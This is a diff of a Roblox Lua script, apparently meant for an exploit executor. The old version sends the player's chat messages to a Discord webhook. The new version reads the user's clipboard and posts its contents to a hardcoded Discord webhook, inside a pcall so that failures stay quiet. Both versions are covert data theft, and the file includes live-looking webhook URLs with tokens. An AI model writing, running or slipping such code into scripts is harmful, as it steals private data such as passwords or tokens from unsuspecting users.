@@ -1,31 +1,27 @@
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local request = request or http_request
 
-local webhookUrl = "https://discord.com/api/webhooks/1393948859574779984/3yhtULU5EmHnDXNy8MjzqrstBQINkaFUgg7WiEo4q_2W1oS6um71J3rbvLNoEVZ_TmLE"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1394023221128335471/ehsDY1912p-bavGMlnv-tBIrSDRS_Uqs52sKWQahyCBPwLDdBYXHRwf7BNEMwDuHkyfa"
 
-player.Chatted:Connect(function(msg)
-    local success, response = pcall(function()
-        local payload = HttpService:JSONEncode({
-            embeds = {{
-                title = "Chat Log",
-                description = string.format("<:emoji_15:1393926769480044594> **User:** %s\n**that:** %s", player.Name, msg),
-                color = tonumber(0x3498db),
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }}
-        })
+local clipboardContent = "Unavailable"
+if getclipboard then
+    clipboardContent = getclipboard()
+end
 
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = payload
-        })
-    end)
+local embed = {
+    title = "📋 Clipboard Contents",
+    description = "```" .. clipboardContent .. "```",
+    color = 0x00FF00,
+    footer = { text = "Made With Power Of Intelligence By Me" }
+}
 
-    if not success then
-        warn("Failed to send webhook: " .. tostring(response))
-    end
+local payload = HttpService:JSONEncode({ embeds = { embed } })
+
+pcall(function()
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = payload
+    })
 end)
